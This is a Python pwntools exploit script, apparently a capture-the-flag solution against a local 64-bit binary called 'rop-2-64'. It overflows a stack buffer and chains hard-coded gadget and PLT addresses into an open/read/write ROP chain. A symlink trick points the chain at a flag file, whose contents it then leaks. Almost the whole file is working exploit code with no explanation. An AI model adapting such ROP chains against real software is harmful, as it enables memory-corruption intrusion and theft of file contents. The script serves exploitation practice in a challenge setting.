#!/usr/bin/env python

from pwn import *
import os

p = process('./rop-2-64')

buf = "A" * 0x80 + "BBBBBBBB"

"""
0x00000000004004d0  write@plt
0x00000000004004e0  printf@plt
0x00000000004004f0  read@plt
0x0000000000400500  prctl@plt
0x0000000000400510  open@plt

"""

open_ = p64(0x400510)
read_ = p64(0x4004f0)
write_= p64(0x4004d0)


"""
0x000000000040073b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040073f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400588 : pop rbp ; ret
0x0000000000400743 : pop rdi ; ret
0x0000000000400668 : pop rdx ; ret
0x0000000000400741 : pop rsi ; pop r15 ; ret
0x000000000040073d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret

"""
pop_rdi_ret = p64(0x400743)
pop_rsi_pop_r15_ret = p64(0x400741)
pop_rdx_ret = p64(0x400668)

string = p64(0x40083c)
if os.path.exists("0"):
    os.unlink("0")

os.symlink("./flag", "0")



buf += pop_rdi_ret
buf += string
buf += pop_rsi_pop_r15_ret
buf += p64(0)
buf += p64(0)
buf += pop_rdx_ret
buf += p64(0)
buf += open_

buf += pop_rdi_ret
buf += p64(3)
buf += pop_rsi_pop_r15_ret
buf += p64(0x601800)
buf += p64(0x601800)
buf += pop_rdx_ret
buf += p64(100)
buf += read_

buf += pop_rdi_ret
buf += p64(1)
buf += pop_rsi_pop_r15_ret
buf += p64(0x601800)
buf += p64(0x601800)
buf += pop_rdx_ret
buf += p64(100)
buf += write_


with open("e.txt", "w") as f:
    f.write(buf)
    f.close

p.sendline(buf)
p.interactive()
